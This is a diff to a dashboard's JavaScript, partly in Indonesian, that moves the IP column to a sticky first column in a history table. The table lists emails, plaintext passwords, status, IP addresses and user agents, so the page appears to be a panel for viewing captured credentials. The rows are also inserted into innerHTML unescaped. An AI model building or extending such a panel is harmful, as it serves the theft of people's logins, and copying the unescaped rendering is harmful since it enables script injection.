@@ -417,24 +417,24 @@
                 }
                 const rows = data.map(r => `
                     <tr>
+                        <td style="position: sticky; left: 0; z-index: 1; background: var(--bg-card); font-family: monospace; font-size: 0.85rem; color: #38bdf8;">${r.ip || '-'}</td>
                         <td>${formatDate(r.timestamp)}</td>
                         <td>${r.email}</td>
                         <td>${r.password}</td>
                         <td><span class="badge-${r.status}">${r.status}</span></td>
                         <td style="font-size:0.75rem;color:#71717a;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${r.alias}">${r.alias || '-'}</td>
-                        <td style="font-size:0.75rem;color:#71717a;">${r.ip || '-'}</td>
-                        <td style="font-size:0.72rem;color:#a1a1aa;max-width:220px;word-break:break-word;white-space:normal;line-height:1.4;">${r.ua || '-'}</td>
+                        <td style="font-size:0.72rem;color:#a1a1aa;white-space:nowrap;">${r.ua || '-'}</td>
                     </tr>`).join('');
                 historyContent.innerHTML = `
                     <table class="history-table">
                         <thead>
                             <tr>
+                                <th style="position: sticky; left: 0; z-index: 2; background: var(--bg-card);">IP Address</th>
                                 <th>Waktu</th>
                                 <th>Email</th>
                                 <th>Password</th>
                                 <th>Status</th>
                                 <th>Alias</th>
-                                <th>IP</th>
                                 <th>User Agent</th>
                             </tr>
                         </thead>
